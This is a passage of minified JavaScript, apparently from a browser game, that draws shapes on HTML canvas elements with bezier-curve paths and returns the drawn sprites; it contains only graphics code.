                    s.bezierCurveTo(2.011383056640625 * e, 231.76705932617188 * e, 4.011383056640625 * e, 232.76705932617188 * e, 11.011383056640625 * e, 230.76705932617188 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(13.011383056640625 * e, 229.76705932617188 * e),
                    s.bezierCurveTo(45.511383056640625 * e, 233.76705932617188 * e, 45.511383056640625 * e, 233.76705932617188 * e, 78.01138305664062 * e, 237.76705932617188 * e),
                    s.bezierCurveTo(92.01138305664062 * e, 239.76705932617188 * e, 92.01138305664062 * e, 246.76705932617188 * e, 91.01138305664062 * e, 257.7670593261719 * e),
                    s.bezierCurveTo(92.01138305664062 * e, 275.7670593261719 * e, 91.01138305664062 * e, 274.7670593261719 * e, 68.01138305664062 * e, 276.7670593261719 * e),
                    s.bezierCurveTo(42.511383056640625 * e, 279.7670593261719 * e, 42.511383056640625 * e, 279.7670593261719 * e, 17.011383056640625 * e, 282.7670593261719 * e),
                    s.bezierCurveTo(2.011383056640625 * e, 282.7670593261719 * e, 3.011383056640625 * e, 276.7670593261719 * e, 2.011383056640625 * e, 260.7670593261719 * e),
                    s.bezierCurveTo(2.011383056640625 * e, 231.76705932617188 * e, 4.011383056640625 * e, 232.76705932617188 * e, 11.011383056640625 * e, 230.76705932617188 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(97.01138305664062 * e, 329.7670593261719 * e),
                    s.bezierCurveTo(68.51138305664062 * e, 343.7670593261719 * e, 68.51138305664062 * e, 343.7670593261719 * e, 40.011383056640625 * e, 357.7670593261719 * e),
                    s.bezierCurveTo(29.011383056640625 * e, 360.7670593261719 * e, 27.011383056640625 * e, 361.7670593261719 * e, 20.011383056640625 * e, 346.7670593261719 * e),
                    s.bezierCurveTo(16.511383056640625 * e, 336.2670593261719 * e, 16.511383056640625 * e, 336.2670593261719 * e, 13.011383056640625 * e, 325.7670593261719 * e),
                    s.bezierCurveTo(10.011383056640625 * e, 307.7670593261719 * e, 18.011383056640625 * e, 312.7670593261719 * e, 34.011383056640625 * e, 306.7670593261719 * e),
                    s.bezierCurveTo(59.511383056640625 * e, 302.2670593261719 * e, 59.511383056640625 * e, 302.2670593261719 * e, 85.01138305664062 * e, 297.7670593261719 * e),
                    s.bezierCurveTo(97.01138305664062 * e, 294.7670593261719 * e, 100.01138305664062 * e, 297.7670593261719 * e, 100.01138305664062 * e, 307.7670593261719 * e),
                    s.bezierCurveTo(105.01138305664062 * e, 326.7670593261719 * e, 103.01138305664062 * e, 325.7670593261719 * e, 97.01138305664062 * e, 329.7670593261719 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(97.01138305664062 * e, 329.7670593261719 * e),
                    s.bezierCurveTo(68.51138305664062 * e, 343.7670593261719 * e, 68.51138305664062 * e, 343.7670593261719 * e, 40.011383056640625 * e, 357.7670593261719 * e),
                    s.bezierCurveTo(29.011383056640625 * e, 360.7670593261719 * e, 27.011383056640625 * e, 361.7670593261719 * e, 20.011383056640625 * e, 346.7670593261719 * e),
                    s.bezierCurveTo(16.511383056640625 * e, 336.2670593261719 * e, 16.511383056640625 * e, 336.2670593261719 * e, 13.011383056640625 * e, 325.7670593261719 * e),
                    s.bezierCurveTo(10.011383056640625 * e, 307.7670593261719 * e, 18.011383056640625 * e, 312.7670593261719 * e, 34.011383056640625 * e, 306.7670593261719 * e),
                    s.bezierCurveTo(59.511383056640625 * e, 302.2670593261719 * e, 59.511383056640625 * e, 302.2670593261719 * e, 85.01138305664062 * e, 297.7670593261719 * e),
                    s.bezierCurveTo(97.01138305664062 * e, 294.7670593261719 * e, 100.01138305664062 * e, 297.7670593261719 * e, 100.01138305664062 * e, 307.7670593261719 * e),
                    s.bezierCurveTo(105.01138305664062 * e, 326.7670593261719 * e, 103.01138305664062 * e, 325.7670593261719 * e, 97.01138305664062 * e, 329.7670593261719 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(394.0113830566406 * e, 181.76705932617188 * e),
                    s.bezierCurveTo(426.5113830566406 * e, 166.76705932617188 * e, 426.5113830566406 * e, 166.76705932617188 * e, 459.0113830566406 * e, 151.76705932617188 * e),
                    s.bezierCurveTo(469.0113830566406 * e, 152.76705932617188 * e, 469.0113830566406 * e, 155.76705932617188 * e, 472.0113830566406 * e, 165.76705932617188 * e),
                    s.bezierCurveTo(476.0113830566406 * e, 177.26705932617188 * e, 476.0113830566406 * e, 177.26705932617188 * e, 480.0113830566406 * e, 188.76705932617188 * e),
                    s.bezierCurveTo(483.0113830566406 * e, 199.76705932617188 * e, 480.0113830566406 * e, 200.76705932617188 * e, 460.0113830566406 * e, 205.76705932617188 * e),
                    s.bezierCurveTo(433.5113830566406 * e, 210.26705932617188 * e, 433.5113830566406 * e, 210.26705932617188 * e, 407.0113830566406 * e, 214.76705932617188 * e),
                    s.bezierCurveTo(395.0113830566406 * e, 218.76705932617188 * e, 397.0113830566406 * e, 211.76705932617188 * e, 393.0113830566406 * e, 202.76705932617188 * e),
                    s.bezierCurveTo(387.0113830566406 * e, 188.76705932617188 * e, 387.0113830566406 * e, 187.76705932617188 * e, 394.0113830566406 * e, 181.76705932617188 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(394.0113830566406 * e, 181.76705932617188 * e),
                    s.bezierCurveTo(426.5113830566406 * e, 166.76705932617188 * e, 426.5113830566406 * e, 166.76705932617188 * e, 459.0113830566406 * e, 151.76705932617188 * e),
                    s.bezierCurveTo(469.0113830566406 * e, 152.76705932617188 * e, 469.0113830566406 * e, 155.76705932617188 * e, 472.0113830566406 * e, 165.76705932617188 * e),
                    s.bezierCurveTo(476.0113830566406 * e, 177.26705932617188 * e, 476.0113830566406 * e, 177.26705932617188 * e, 480.0113830566406 * e, 188.76705932617188 * e),
                    s.bezierCurveTo(483.0113830566406 * e, 199.76705932617188 * e, 480.0113830566406 * e, 200.76705932617188 * e, 460.0113830566406 * e, 205.76705932617188 * e),
                    s.bezierCurveTo(433.5113830566406 * e, 210.26705932617188 * e, 433.5113830566406 * e, 210.26705932617188 * e, 407.0113830566406 * e, 214.76705932617188 * e),
                    s.bezierCurveTo(395.0113830566406 * e, 218.76705932617188 * e, 397.0113830566406 * e, 211.76705932617188 * e, 393.0113830566406 * e, 202.76705932617188 * e),
                    s.bezierCurveTo(387.0113830566406 * e, 188.76705932617188 * e, 387.0113830566406 * e, 187.76705932617188 * e, 394.0113830566406 * e, 181.76705932617188 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(411.0113830566406 * e, 234.76705932617188 * e),
                    s.bezierCurveTo(446.0113830566406 * e, 233.26705932617188 * e, 446.0113830566406 * e, 233.26705932617188 * e, 481.0113830566406 * e, 231.76705932617188 * e),
                    s.bezierCurveTo(491.0113830566406 * e, 232.76705932617188 * e, 493.0113830566406 * e, 239.76705932617188 * e, 491.0113830566406 * e, 251.76705932617188 * e),
                    s.bezierCurveTo(490.0113830566406 * e, 263.7670593261719 * e, 490.0113830566406 * e, 263.7670593261719 * e, 489.0113830566406 * e, 275.7670593261719 * e),
                    s.bezierCurveTo(487.0113830566406 * e, 283.7670593261719 * e, 483.0113830566406 * e, 284.7670593261719 * e, 464.0113830566406 * e, 280.7670593261719 * e),
                    s.bezierCurveTo(437.0113830566406 * e, 273.7670593261719 * e, 437.0113830566406 * e, 273.7670593261719 * e, 410.0113830566406 * e, 266.7670593261719 * e),
                    s.bezierCurveTo(400.0113830566406 * e, 261.7670593261719 * e, 401.0113830566406 * e, 259.7670593261719 * e, 402.0113830566406 * e, 249.76705932617188 * e),
                    s.bezierCurveTo(401.0113830566406 * e, 237.76705932617188 * e, 403.0113830566406 * e, 235.76705932617188 * e, 408.0113830566406 * e, 234.76705932617188 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(411.0113830566406 * e, 234.76705932617188 * e),
                    s.bezierCurveTo(446.0113830566406 * e, 233.26705932617188 * e, 446.0113830566406 * e, 233.26705932617188 * e, 481.0113830566406 * e, 231.76705932617188 * e),
                    s.bezierCurveTo(491.0113830566406 * e, 232.76705932617188 * e, 493.0113830566406 * e, 239.76705932617188 * e, 491.0113830566406 * e, 251.76705932617188 * e),
                    s.bezierCurveTo(490.0113830566406 * e, 263.7670593261719 * e, 490.0113830566406 * e, 263.7670593261719 * e, 489.0113830566406 * e, 275.7670593261719 * e),
                    s.bezierCurveTo(487.0113830566406 * e, 283.7670593261719 * e, 483.0113830566406 * e, 284.7670593261719 * e, 464.0113830566406 * e, 280.7670593261719 * e),
                    s.bezierCurveTo(437.0113830566406 * e, 273.7670593261719 * e, 437.0113830566406 * e, 273.7670593261719 * e, 410.0113830566406 * e, 266.7670593261719 * e),
                    s.bezierCurveTo(400.0113830566406 * e, 261.7670593261719 * e, 401.0113830566406 * e, 259.7670593261719 * e, 402.0113830566406 * e, 249.76705932617188 * e),
                    s.bezierCurveTo(401.0113830566406 * e, 237.76705932617188 * e, 403.0113830566406 * e, 235.76705932617188 * e, 408.0113830566406 * e, 234.76705932617188 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(400.0113830566406 * e, 290.7670593261719 * e),
                    s.bezierCurveTo(437.0113830566406 * e, 301.2670593261719 * e, 437.0113830566406 * e, 301.2670593261719 * e, 474.0113830566406 * e, 311.7670593261719 * e),
                    s.bezierCurveTo(484.0113830566406 * e, 319.7670593261719 * e, 481.0113830566406 * e, 322.7670593261719 * e, 474.0113830566406 * e, 335.7670593261719 * e),
                    s.bezierCurveTo(465.5113830566406 * e, 354.7670593261719 * e, 465.5113830566406 * e, 354.7670593261719 * e, 457.0113830566406 * e, 373.7670593261719 * e),
                    s.bezierCurveTo(449.0113830566406 * e, 386.7670593261719 * e, 444.0113830566406 * e, 384.7670593261719 * e, 427.0113830566406 * e, 370.7670593261719 * e),
                    s.bezierCurveTo(403.0113830566406 * e, 354.7670593261719 * e, 403.0113830566406 * e, 354.7670593261719 * e, 379.0113830566406 * e, 338.7670593261719 * e),
                    s.bezierCurveTo(371.0113830566406 * e, 327.7670593261719 * e, 373.0113830566406 * e, 323.7670593261719 * e, 377.0113830566406 * e, 313.7670593261719 * e),
                    s.bezierCurveTo(386.0113830566406 * e, 292.7670593261719 * e, 393.0113830566406 * e, 288.7670593261719 * e, 398.0113830566406 * e, 291.7670593261719 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(400.0113830566406 * e, 290.7670593261719 * e),
                    s.bezierCurveTo(437.0113830566406 * e, 301.2670593261719 * e, 437.0113830566406 * e, 301.2670593261719 * e, 474.0113830566406 * e, 311.7670593261719 * e),
                    s.bezierCurveTo(484.0113830566406 * e, 319.7670593261719 * e, 481.0113830566406 * e, 322.7670593261719 * e, 474.0113830566406 * e, 335.7670593261719 * e),
                    s.bezierCurveTo(465.5113830566406 * e, 354.7670593261719 * e, 465.5113830566406 * e, 354.7670593261719 * e, 457.0113830566406 * e, 373.7670593261719 * e),
                    s.bezierCurveTo(449.0113830566406 * e, 386.7670593261719 * e, 444.0113830566406 * e, 384.7670593261719 * e, 427.0113830566406 * e, 370.7670593261719 * e),
                    s.bezierCurveTo(403.0113830566406 * e, 354.7670593261719 * e, 403.0113830566406 * e, 354.7670593261719 * e, 379.0113830566406 * e, 338.7670593261719 * e),
                    s.bezierCurveTo(371.0113830566406 * e, 327.7670593261719 * e, 373.0113830566406 * e, 323.7670593261719 * e, 377.0113830566406 * e, 313.7670593261719 * e),
                    s.bezierCurveTo(386.0113830566406 * e, 292.7670593261719 * e, 393.0113830566406 * e, 288.7670593261719 * e, 398.0113830566406 * e, 291.7670593261719 * e),
                    s.closePath(),
                    he(s, i[3], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(366.0113830566406 * e, 361.2216033935547 * e),
                    s.bezierCurveTo(393.0113830566406 * e, 383.2216033935547 * e, 393.0113830566406 * e, 383.2216033935547 * e, 420.0113830566406 * e, 405.2216033935547 * e),
                    s.bezierCurveTo(427.0113830566406 * e, 414.2216033935547 * e, 425.0113830566406 * e, 417.2216033935547 * e, 413.0113830566406 * e, 428.2216033935547 * e),
                    s.bezierCurveTo(405.5113830566406 * e, 435.2216033935547 * e, 405.5113830566406 * e, 435.2216033935547 * e, 398.0113830566406 * e, 442.2216033935547 * e),
                    s.bezierCurveTo(388.0113830566406 * e, 451.2216033935547 * e, 385.0113830566406 * e, 445.2216033935547 * e, 373.0113830566406 * e, 428.2216033935547 * e),
                    s.bezierCurveTo(358.5113830566406 * e, 408.2216033935547 * e, 358.5113830566406 * e, 408.2216033935547 * e, 344.0113830566406 * e, 388.2216033935547 * e),
                    s.bezierCurveTo(337.0113830566406 * e, 378.2216033935547 * e, 342.0113830566406 * e, 377.2216033935547 * e, 347.0113830566406 * e, 371.2216033935547 * e),
                    s.bezierCurveTo(359.0113830566406 * e, 359.2216033935547 * e, 361.0113830566406 * e, 358.2216033935547 * e, 364.0113830566406 * e, 361.2216033935547 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(366.0113830566406 * e, 361.2216033935547 * e),
                    s.bezierCurveTo(393.0113830566406 * e, 383.2216033935547 * e, 393.0113830566406 * e, 383.2216033935547 * e, 420.0113830566406 * e, 405.2216033935547 * e),
                    s.bezierCurveTo(427.0113830566406 * e, 414.2216033935547 * e, 425.0113830566406 * e, 417.2216033935547 * e, 413.0113830566406 * e, 428.2216033935547 * e),
                    s.bezierCurveTo(405.5113830566406 * e, 435.2216033935547 * e, 405.5113830566406 * e, 435.2216033935547 * e, 398.0113830566406 * e, 442.2216033935547 * e),
                    s.bezierCurveTo(388.0113830566406 * e, 451.2216033935547 * e, 385.0113830566406 * e, 445.2216033935547 * e, 373.0113830566406 * e, 428.2216033935547 * e),
                    s.bezierCurveTo(358.5113830566406 * e, 408.2216033935547 * e, 358.5113830566406 * e, 408.2216033935547 * e, 344.0113830566406 * e, 388.2216033935547 * e),
                    s.bezierCurveTo(337.0113830566406 * e, 378.2216033935547 * e, 342.0113830566406 * e, 377.2216033935547 * e, 347.0113830566406 * e, 371.2216033935547 * e),
                    s.bezierCurveTo(359.0113830566406 * e, 359.2216033935547 * e, 361.0113830566406 * e, 358.2216033935547 * e, 364.0113830566406 * e, 361.2216033935547 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(323.0113830566406 * e, 393.2216033935547 * e),
                    s.bezierCurveTo(338.0113830566406 * e, 424.7216033935547 * e, 338.0113830566406 * e, 424.7216033935547 * e, 353.0113830566406 * e, 456.2216033935547 * e),
                    s.bezierCurveTo(355.0113830566406 * e, 467.2216033935547 * e, 354.0113830566406 * e, 469.2216033935547 * e, 336.0113830566406 * e, 475.2216033935547 * e),
                    s.bezierCurveTo(326.0113830566406 * e, 478.2216033935547 * e, 326.0113830566406 * e, 478.2216033935547 * e, 316.0113830566406 * e, 481.2216033935547 * e),
                    s.bezierCurveTo(304.0113830566406 * e, 484.2216033935547 * e, 304.0113830566406 * e, 477.2216033935547 * e, 301.0113830566406 * e, 454.2216033935547 * e),
                    s.bezierCurveTo(295.5113830566406 * e, 429.2216033935547 * e, 295.5113830566406 * e, 429.2216033935547 * e, 290.0113830566406 * e, 404.2216033935547 * e),
                    s.bezierCurveTo(287.0113830566406 * e, 396.2216033935547 * e, 297.0113830566406 * e, 394.2216033935547 * e, 303.0113830566406 * e, 392.2216033935547 * e),
                    s.bezierCurveTo(316.0113830566406 * e, 387.2216033935547 * e, 318.0113830566406 * e, 387.2216033935547 * e, 323.0113830566406 * e, 394.2216033935547 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(323.0113830566406 * e, 393.2216033935547 * e),
                    s.bezierCurveTo(338.0113830566406 * e, 424.7216033935547 * e, 338.0113830566406 * e, 424.7216033935547 * e, 353.0113830566406 * e, 456.2216033935547 * e),
                    s.bezierCurveTo(355.0113830566406 * e, 467.2216033935547 * e, 354.0113830566406 * e, 469.2216033935547 * e, 336.0113830566406 * e, 475.2216033935547 * e),
                    s.bezierCurveTo(326.0113830566406 * e, 478.2216033935547 * e, 326.0113830566406 * e, 478.2216033935547 * e, 316.0113830566406 * e, 481.2216033935547 * e),
                    s.bezierCurveTo(304.0113830566406 * e, 484.2216033935547 * e, 304.0113830566406 * e, 477.2216033935547 * e, 301.0113830566406 * e, 454.2216033935547 * e),
                    s.bezierCurveTo(295.5113830566406 * e, 429.2216033935547 * e, 295.5113830566406 * e, 429.2216033935547 * e, 290.0113830566406 * e, 404.2216033935547 * e),
                    s.bezierCurveTo(287.0113830566406 * e, 396.2216033935547 * e, 297.0113830566406 * e, 394.2216033935547 * e, 303.0113830566406 * e, 392.2216033935547 * e),
                    s.bezierCurveTo(316.0113830566406 * e, 387.2216033935547 * e, 318.0113830566406 * e, 387.2216033935547 * e, 323.0113830566406 * e, 394.2216033935547 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(270.0113830566406 * e, 413.2216033935547 * e),
                    s.bezierCurveTo(271.0113830566406 * e, 445.7216033935547 * e, 271.0113830566406 * e, 445.7216033935547 * e, 272.0113830566406 * e, 478.2216033935547 * e),
                    s.bezierCurveTo(273.0113830566406 * e, 490.2216033935547 * e, 267.0113830566406 * e, 493.2216033935547 * e, 249.01138305664062 * e, 490.2216033935547 * e),
                    s.bezierCurveTo(222.01138305664062 * e, 492.2216033935547 * e, 220.01138305664062 * e, 485.2216033935547 * e, 225.01138305664062 * e, 467.2216033935547 * e),
                    s.bezierCurveTo(230.51138305664062 * e, 440.2216033935547 * e, 230.51138305664062 * e, 440.2216033935547 * e, 236.01138305664062 * e, 413.2216033935547 * e),
                    s.bezierCurveTo(237.01138305664062 * e, 405.2216033935547 * e, 238.01138305664062 * e, 404.2216033935547 * e, 253.01138305664062 * e, 403.2216033935547 * e),
                    s.bezierCurveTo(269.0113830566406 * e, 405.2216033935547 * e, 270.0113830566406 * e, 407.2216033935547 * e, 269.0113830566406 * e, 412.2216033935547 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(270.0113830566406 * e, 413.2216033935547 * e),
                    s.bezierCurveTo(271.0113830566406 * e, 445.7216033935547 * e, 271.0113830566406 * e, 445.7216033935547 * e, 272.0113830566406 * e, 478.2216033935547 * e),
                    s.bezierCurveTo(273.0113830566406 * e, 490.2216033935547 * e, 267.0113830566406 * e, 493.2216033935547 * e, 249.01138305664062 * e, 490.2216033935547 * e),
                    s.bezierCurveTo(222.01138305664062 * e, 492.2216033935547 * e, 220.01138305664062 * e, 485.2216033935547 * e, 225.01138305664062 * e, 467.2216033935547 * e),
                    s.bezierCurveTo(230.51138305664062 * e, 440.2216033935547 * e, 230.51138305664062 * e, 440.2216033935547 * e, 236.01138305664062 * e, 413.2216033935547 * e),
                    s.bezierCurveTo(237.01138305664062 * e, 405.2216033935547 * e, 238.01138305664062 * e, 404.2216033935547 * e, 253.01138305664062 * e, 403.2216033935547 * e),
                    s.bezierCurveTo(269.0113830566406 * e, 405.2216033935547 * e, 270.0113830566406 * e, 407.2216033935547 * e, 269.0113830566406 * e, 412.2216033935547 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(207.01138305664062 * e, 406.2216033935547 * e),
                    s.bezierCurveTo(197.51138305664062 * e, 440.7216033935547 * e, 197.51138305664062 * e, 440.7216033935547 * e, 188.01138305664062 * e, 475.2216033935547 * e),
                    s.bezierCurveTo(184.01138305664062 * e, 485.2216033935547 * e, 179.01138305664062 * e, 491.2216033935547 * e, 152.01138305664062 * e, 477.2216033935547 * e),
                    s.bezierCurveTo(136.51138305664062 * e, 469.7216033935547 * e, 136.51138305664062 * e, 469.7216033935547 * e, 121.01138305664062 * e, 462.2216033935547 * e),
                    s.bezierCurveTo(109.01138305664062 * e, 453.2216033935547 * e, 117.01138305664062 * e, 447.2216033935547 * e, 133.01138305664062 * e, 427.2216033935547 * e),
                    s.bezierCurveTo(146.51138305664062 * e, 406.7216033935547 * e, 146.51138305664062 * e, 406.7216033935547 * e, 160.01138305664062 * e, 386.2216033935547 * e),
                    s.bezierCurveTo(163.01138305664062 * e, 377.2216033935547 * e, 168.01138305664062 * e, 378.2216033935547 * e, 187.01138305664062 * e, 387.2216033935547 * e),
                    s.bezierCurveTo(206.01138305664062 * e, 395.2216033935547 * e, 208.01138305664062 * e, 398.2216033935547 * e, 207.01138305664062 * e, 405.2216033935547 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(207.01138305664062 * e, 406.2216033935547 * e),
                    s.bezierCurveTo(197.51138305664062 * e, 440.7216033935547 * e, 197.51138305664062 * e, 440.7216033935547 * e, 188.01138305664062 * e, 475.2216033935547 * e),
                    s.bezierCurveTo(184.01138305664062 * e, 485.2216033935547 * e, 179.01138305664062 * e, 491.2216033935547 * e, 152.01138305664062 * e, 477.2216033935547 * e),
                    s.bezierCurveTo(136.51138305664062 * e, 469.7216033935547 * e, 136.51138305664062 * e, 469.7216033935547 * e, 121.01138305664062 * e, 462.2216033935547 * e),
                    s.bezierCurveTo(109.01138305664062 * e, 453.2216033935547 * e, 117.01138305664062 * e, 447.2216033935547 * e, 133.01138305664062 * e, 427.2216033935547 * e),
                    s.bezierCurveTo(146.51138305664062 * e, 406.7216033935547 * e, 146.51138305664062 * e, 406.7216033935547 * e, 160.01138305664062 * e, 386.2216033935547 * e),
                    s.bezierCurveTo(163.01138305664062 * e, 377.2216033935547 * e, 168.01138305664062 * e, 378.2216033935547 * e, 187.01138305664062 * e, 387.2216033935547 * e),
                    s.bezierCurveTo(206.01138305664062 * e, 395.2216033935547 * e, 208.01138305664062 * e, 398.2216033935547 * e, 207.01138305664062 * e, 405.2216033935547 * e),
                    s.closePath(),
                    he(s, i[3], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(130.01138305664062 * e, 375.2216033935547 * e),
                    s.bezierCurveTo(109.51138305664062 * e, 400.7216033935547 * e, 109.51138305664062 * e, 400.7216033935547 * e, 89.01138305664062 * e, 426.2216033935547 * e),
                    s.bezierCurveTo(82.01138305664062 * e, 435.2216033935547 * e, 77.01138305664062 * e, 435.2216033935547 * e, 62.011383056640625 * e, 417.2216033935547 * e),
                    s.bezierCurveTo(43.011383056640625 * e, 397.2216033935547 * e, 47.011383056640625 * e, 395.2216033935547 * e, 62.011383056640625 * e, 382.2216033935547 * e),
                    s.bezierCurveTo(84.01138305664062 * e, 366.7216033935547 * e, 84.01138305664062 * e, 366.7216033935547 * e, 106.01138305664062 * e, 351.2216033935547 * e),
                    s.bezierCurveTo(116.01138305664062 * e, 344.2216033935547 * e, 120.01138305664062 * e, 347.2216033935547 * e, 127.01138305664062 * e, 356.2216033935547 * e),
                    s.bezierCurveTo(137.01138305664062 * e, 366.2216033935547 * e, 137.01138305664062 * e, 366.2216033935547 * e, 131.01138305664062 * e, 376.2216033935547 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(130.01138305664062 * e, 375.2216033935547 * e),
                    s.bezierCurveTo(109.51138305664062 * e, 400.7216033935547 * e, 109.51138305664062 * e, 400.7216033935547 * e, 89.01138305664062 * e, 426.2216033935547 * e),
                    s.bezierCurveTo(82.01138305664062 * e, 435.2216033935547 * e, 77.01138305664062 * e, 435.2216033935547 * e, 62.011383056640625 * e, 417.2216033935547 * e),
                    s.bezierCurveTo(43.011383056640625 * e, 397.2216033935547 * e, 47.011383056640625 * e, 395.2216033935547 * e, 62.011383056640625 * e, 382.2216033935547 * e),
                    s.bezierCurveTo(84.01138305664062 * e, 366.7216033935547 * e, 84.01138305664062 * e, 366.7216033935547 * e, 106.01138305664062 * e, 351.2216033935547 * e),
                    s.bezierCurveTo(116.01138305664062 * e, 344.2216033935547 * e, 120.01138305664062 * e, 347.2216033935547 * e, 127.01138305664062 * e, 356.2216033935547 * e),
                    s.bezierCurveTo(137.01138305664062 * e, 366.2216033935547 * e, 137.01138305664062 * e, 366.2216033935547 * e, 131.01138305664062 * e, 376.2216033935547 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    a
            }
            function _0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 218 * e,
                    n.height = 185 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(64 * e, 53.135406494140625 * e),
                    r.bezierCurveTo(92 * e, 17.135406494140625 * e, 116 * e, 11.135406494140625 * e, 158 * e, 53.135406494140625 * e),
                    r.bezierCurveTo(178 * e, 74.13540649414062 * e, 181 * e, 81.13540649414062 * e, 196 * e, 101.13540649414062 * e),
                    r.bezierCurveTo(214 * e, 127.13540649414062 * e, 192 * e, 138.13540649414062 * e, 173 * e, 149.13540649414062 * e),
                    r.bezierCurveTo(137 * e, 166.13540649414062 * e, 74 * e, 170.13540649414062 * e, 36 * e, 141.13540649414062 * e),
                    r.bezierCurveTo(13 * e, 127.13540649414062 * e, 20 * e, 119.13540649414062 * e, 30 * e, 103.13540649414062 * e),
                    r.bezierCurveTo(48 * e, 71.13540649414062 * e, 54 * e, 67.13540649414062 * e, 63 * e, 54.135406494140625 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(107 * e, 25.135406494140625 * e),
                    r.bezierCurveTo(62 * e, 90.13540649414062 * e, 54 * e, 129.13540649414062 * e, 53 * e, 151.13540649414062 * e),
                    r.bezierCurveTo(39.5 * e, 142.13540649414062 * e, 39.5 * e, 142.13540649414062 * e, 26 * e, 133.13540649414062 * e),
                    r.bezierCurveTo(23.5 * e, 128.63540649414062 * e, 23.5 * e, 128.63540649414062 * e, 21 * e, 124.13540649414062 * e),
                    r.bezierCurveTo(22 * e, 113.13540649414062 * e, 31 * e, 99.13540649414062 * e, 40 * e, 88.13540649414062 * e),
                    r.bezierCurveTo(54.5 * e, 67.13540649414062 * e, 54.5 * e, 67.13540649414062 * e, 69 * e, 46.135406494140625 * e),
                    r.bezierCurveTo(80.5 * e, 36.635406494140625 * e, 80.5 * e, 36.635406494140625 * e, 92 * e, 27.135406494140625 * e),
                    r.closePath(),
                    he(r, i[1]),
                    n
            }
            function E0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 167 * e,
                    n.height = 136 * e,
                    r.globalAlpha = .5,
                    r.save(),
                    r.translate(76.71426391601562 * e, 67.85713195800781 * e),
                    Ve(r, -57.5 * e, -54.5 * e, 115 * e, 109 * e, 15 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = .8,
                    r.save(),
                    r.translate(76.71426391601562 * e, 67.85713195800781 * e),
                    Ve(r, -57.5 * e, -54.5 * e, 115 * e, 109 * e, 15 * e),
                    r.restore(),
                    he(r, void 0, i[1], 7 * e),
